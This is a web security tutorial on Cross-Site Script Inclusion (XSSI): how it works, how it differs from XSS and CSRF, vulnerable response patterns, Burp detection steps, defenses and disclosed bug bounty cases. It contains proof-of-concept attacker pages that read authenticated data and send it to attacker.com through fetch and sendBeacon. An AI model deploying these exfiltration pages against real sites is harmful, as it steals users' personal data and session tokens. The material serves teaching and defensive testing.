Section 01

What Is XSSI?

Cross-Site Script Inclusion (XSSI) is a class of attacks that exploits the browser's exception to the Same-Origin Policy for <script> tags. Unlike traditional resource requests, browsers allow any page to load JavaScript from any origin via <script src="..."> — no CORS preflight, no origin check, and crucially, the cookies for the target origin are sent automatically.

The attack model is deceptively simple: if a victim site serves user-specific data embedded inside a JavaScript response (as a variable assignment, an array literal, or a JSONP callback), an attacker-controlled page can include that URL as a script tag. The browser fetches the resource with the victim's session cookies attached, executes the JavaScript, and the attacker's page can then read the resulting variable values.

This is fundamentally different from XSS. In XSS, the attacker injects code into the victim's page and runs in the victim's origin. In XSSI, the attacker's page is the host — it pulls authenticated data from the victim's server into its own context. The browser is not the victim; the browser is the unwitting delivery mechanism.

The Core Condition
XSSI requires three conditions to be exploitable: (1) an endpoint returns authenticated, user-specific data, (2) the response is valid JavaScript that the browser will execute, and (3) the data is accessible from the global scope after execution. All three must be true simultaneously.
The Script Tag Exception
Browsers allow cross-origin script loads as a design decision predating SOP. A page at attacker.com can freely include scripts from victim.com — this is how CDNs work.
SOP Bypass
Cookie Inclusion
When a browser fetches a script from victim.com, it includes all cookies for victim.com. If the endpoint requires authentication, the victim's session is automatically used.
Session Theft
Data as JavaScript
The vulnerability surfaces when data responses are formatted as executable JavaScript instead of pure JSON. The attacker's page gets execution context over the data.
Data Exposure
Section 02

How It Works

The attack requires the victim to be logged into the target site in the same browser that visits the attacker's page. When both conditions are true, the attack executes transparently. Walk through this scenario step by step.

Attack Scenario: Authenticated API Endpoint
01
Victim site exposes data as JavaScript
The target application serves user profile data at an authenticated endpoint. The response is JavaScript, not JSON.
02
Victim is logged in
The victim has an active session cookie for corp.net stored in their browser.
03
Victim visits attacker's page
Attacker sends a phishing link or embeds a malicious ad. Victim opens attacker.com in the same browser.
04
Attacker page includes the victim's API as a script
The browser sees a <script src> pointing to corp.net, fetches it with the victim's cookies attached, and executes the response.
05
Attacker reads the data
The script executed a variable assignment into the global scope. The attacker's code accesses the variable and exfiltrates the data.

Victim Server: The Vulnerable Endpoint

The victim site serves this endpoint at https://corp.net/api/user-data.js. It requires authentication but returns JavaScript:

// victim server response (Content-Type: application/javascript)
// corp.net/api/user-data.js -- requires valid session cookie var userData = { name: "Agent_X", email: "agent@corp.net", role: "admin", token: "eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjQ3fQ.abc", mfa_backup_codes: ["482910", "773021", "994817"] };

Attacker's Page: The Exploit

// attacker.com/steal.html
<!DOCTYPE html> <html> <head><title>Free Gift Card Generator</title></head> <body> <!-- Step 1: Browser fetches this with victim's cookies. userData variable is now set in global scope. --> <script src="https://corp.net/api/user-data.js"></script> <script> // Step 2: userData is now accessible — browser executed the script above. // The SOP does NOT prevent reading variables set by cross-origin scripts. window.onload = function() { if (typeof userData !== 'undefined') { // Step 3: Exfiltrate to attacker's collection server. fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify(userData) }); } }; </script> </body> </html>
Why SOP Doesn't Help Here
The Same-Origin Policy prevents reading responses to cross-origin requests made via fetch() or XHR. But script tags are different: the browser executes the response. Once executed, the variable is in the attacker page's own JavaScript scope — no cross-origin read occurs. The data is already on the attacker's side.
Section 03

XSSI vs XSS vs CSRF

All three attacks exploit the browser's trust model around same-origin policies, but they operate on different sides of the transaction. Understanding where each attack lives in the request-response lifecycle clarifies why separate defenses are required.

Attribute XSS CSRF XSSI
Attacker's Page Not needed (code runs on victim's origin) Hosts the malicious request Hosts the malicious script inclusion
Attack Origin Victim's own origin Cross-origin (attacker site) Cross-origin (attacker site)
Goal Code execution in victim's browser session Perform state-changing actions as the victim Read authenticated data from victim's responses
Exploit Vector Injected script into victim page's DOM Hidden form / img tag / fetch to victim API <script src> pointing to victim's JS endpoint
Cookie Usage Has full access to victim origin cookies Browser sends victim cookies with request Browser sends victim cookies with script fetch
Requires Login No (but escalates with auth) Yes (performs actions as victim) Yes (reads victim's personalized data)
Primary Defense Output encoding, CSP CSRF tokens, SameSite cookies application/json Content-Type, response prefix
Severity Critical High High
The Trust Triangle
XSS exploits the victim's trust in their own site's content. CSRF exploits the victim site's trust in the victim's browser. XSSI exploits the browser's trust in script tags from any origin. Each attack lives at a different edge of the three-way trust relationship between user, browser, and server.
Section 04

Vulnerable Patterns

XSSI exploitability is determined by how the server formats its response. Four common patterns create the vulnerability. Each can appear independently or in combination.

JSONP Callbacks
Classic and most exploitable. The endpoint wraps JSON in a named function call. The attacker defines that function before including the script.
// server response
// GET /api/user?callback=myFunc myFunc({ uid: 4721, email: "victim@corp.net", api_key: "sk-live-9f3a..." });
Variable Assignment
Data assigned directly to a global variable. After the script loads and executes, the attacker's code reads the variable from the global scope.
// server response
var CONFIG = { userId: 4721, role: "admin", csrf: "f3a9c...", balance: 84250.00 };
Bare Array/Object Literal
A JSON array returned directly as a JavaScript response. Valid JS, valid exploit. The Array constructor override technique (ES5 era) intercepts it.
// server response (Content-Type: application/javascript)
[ {"id": 1, "ssn": "123-45-6789"}, {"id": 2, "ssn": "987-65-4321"}, {"id": 3, "ssn": "456-78-9012"} ]
Dynamic JS Files
Server-rendered JavaScript files that embed authenticated state — common in legacy applications that embed session data into bundled JS at request time.
// server-rendered .js file, generated per request
// Generated by app server for authenticated user window.APP_CONTEXT = { user: { id: 4721, name: "Agent_X" }, session_expires: "2026-04-12T18:00:00Z", permissions: ["admin", "export", "delete"] };

The Array Constructor Override (Legacy Attack)

For endpoints returning bare array literals, browsers in ES5 era allowed overriding the global Array constructor before script execution. When the response [{...}, {...}] was parsed, the overridden constructor was called with the data. Modern browsers restrict this, but it remains relevant in older environments and as a concept in reports.

// Attacker's page — ES5 Array constructor override
<script> // Override Array constructor BEFORE loading the victim's script. // When the bare array literal is evaluated, this constructor runs. function Array() { this[0] = arguments[0]; // capture first element exfiltrate(this); } function exfiltrate(data) { navigator.sendBeacon('https://attacker.com/log', JSON.stringify(data)); } </script> <!-- Loaded AFTER override — browser calls our Array() during parsing --> <script src="https://corp.net/api/records.js"></script>
Section 05

Detection Techniques

Finding XSSI during a bug bounty engagement requires systematically identifying endpoints that return JavaScript and checking whether they carry authenticated data. The workflow below maps directly to a Burp Suite session.

Step 1 — Identify Candidate Endpoints

In Burp Proxy, filter by response Content-Type:

// Burp filter — HTTP history view
Filter: Content-Type CONTAINS "application/javascript" OR Content-Type CONTAINS "text/javascript" Look for: - Endpoints under /api/, /data/, /user/, /account/ - .js files that vary per request (check Cache-Control: no-store) - Responses containing JSON-like structures (braces, brackets, colons) - Callbacks: grep response body for "callback", "jsonp", "cb="

Step 2 — Verify Authentication Dependency

Replay the request without cookies. If the response body changes significantly — returns empty data, an error, or different values — the endpoint is authentication-sensitive.

// Burp Repeater — cookie strip test
GET /api/user-data.js HTTP/1.1 Host: corp.net # With cookies: returns full userData object with PII GET /api/user-data.js HTTP/1.1 Host: corp.net Cookie: (empty / removed) # Without cookies: returns {} or 401 — endpoint is auth-gated

Step 3 — Test for JSONP Parameters

// Common JSONP parameter names to test
?callback=test ?cb=test ?jsonp=test ?handler=test ?func=test ?fn=test ?callbackFn=test # If response wraps in your function name: # test({"uid":4721,...}) <-- vulnerable # {"uid":4721,...} <-- JSONP not enabled

Step 4 — Confirm Exploitability

Build a minimal proof-of-concept page. Open it in a browser where you are logged into the target. Check the browser console or a local listener for the exfiltrated data. Only do this in an authorized testing environment.

Hunting Tip: Check Legacy Endpoints
JSONP was a common pre-CORS workaround from 2008 to 2015. Older applications often still expose JSONP endpoints that have been forgotten. Search the JS codebase for $.getJSON with a callback parameter, or callback= in any network request. These are almost always XSSI candidates.
Section 06

Prevention

Eliminating XSSI requires preventing the browser from treating authenticated data responses as executable JavaScript. Several complementary defenses apply.

  • Use application/json, Not application/javascript
    The single most effective fix. Respond with Content-Type: application/json for all data endpoints. Browsers refuse to execute a script tag response with a JSON content type. XSSI requires the browser to execute the response.
  • JSON Response Prefix: )]}',
    Prefix all JSON responses with a string that makes the response invalid JavaScript but is stripped by your client-side fetch layer. Google has used this extensively. A bare )]}' before the JSON causes a SyntaxError if executed as a script.
  • X-Content-Type-Options: nosniff
    Prevents browsers from MIME-sniffing the response. Without this header, a browser may execute a response with Content-Type: text/plain if the content looks like JavaScript. nosniff enforces the declared content type.
  • Eliminate JSONP Entirely
    JSONP is obsolete. Replace all JSONP endpoints with proper CORS-enabled fetch() requests. CORS allows cross-origin requests where explicitly permitted, without sacrificing the SOP protection that JSONP bypasses entirely.
  • SameSite Cookie Attribute
    SameSite=Strict or SameSite=Lax prevents session cookies from being sent with cross-site script tag requests in modern browsers. Strict provides complete protection; Lax allows top-level navigation but blocks subresource requests.
  • Anti-CSRF Tokens on Data Endpoints
    Require a custom request header (e.g., X-Requested-With: XMLHttpRequest) or a CSRF token on all data API endpoints. Script tags cannot set custom headers, so an endpoint requiring them cannot be exploited via XSSI.

Vulnerable Response

HTTP/1.1 200 OK Content-Type: application/javascript Cache-Control: no-store var userData = { email: "victim@corp.net", token: "sk-abc123" };

Hardened Response

HTTP/1.1 200 OK Content-Type: application/json X-Content-Type-Options: nosniff Cache-Control: no-store )]}' {"email":"victim@corp.net", "token":"sk-abc123"}
Section 07

Real-World Examples

XSSI has appeared in bug bounty reports against several major platforms. The following cases are drawn from publicly disclosed reports and security research. All were reported responsibly and patched before disclosure.

Google (Bug Bounty -- Multiple Programs)
JSONP Endpoints Across Google Services
Google's security team has historically documented XSSI as a known issue class. The )]}' prefix pattern was developed specifically as a response to XSSI findings across Google products. Google's Bughunter University explicitly lists "Cross-Site Script Inclusion" as an eligible vulnerability class. Researchers found authenticated JSONP endpoints on Calendar, Drive, and Contacts that exposed contact lists and calendar event data. Google subsequently rolled out the prefix pattern and SameSite cookies platform-wide.
Facebook (Bug Bounty -- Multiple Reporters)
Dynamic JavaScript Configuration Leakage
Facebook's legacy application architecture served per-request JavaScript configuration files that included user-specific data such as friend lists, group memberships, and application permission scopes. Several researchers independently discovered that these endpoints were accessible via script tag inclusion. Facebook addressed these findings by migrating configuration delivery to application/json endpoints protected by custom request headers, and by enforcing the SameSite=Strict cookie attribute on authentication cookies.
General Pattern -- Legacy Enterprise Applications
JSONP Callback Parameters in Forgotten API Endpoints
A recurring pattern in enterprise web applications built between 2008 and 2014: an API endpoint added a ?callback= parameter for a now-deleted frontend feature. The parameter is no longer used by the application but was never removed from the server. A researcher submitting a ?callback=myFunction parameter receives a JSONP-wrapped response with the victim's authenticated session data. These are consistently rated High severity on HackerOne and Bugcrowd when PII or tokens are exposed.
Scope and Authorization Reminder
Building and deploying an actual XSSI exploit page — even to test a finding — must only occur within the scope of an authorized bug bounty program or explicit written authorization. Do not host exploit pages that target real production users. In a bug report, the proof-of-concept code is sufficient evidence without execution against real sessions.
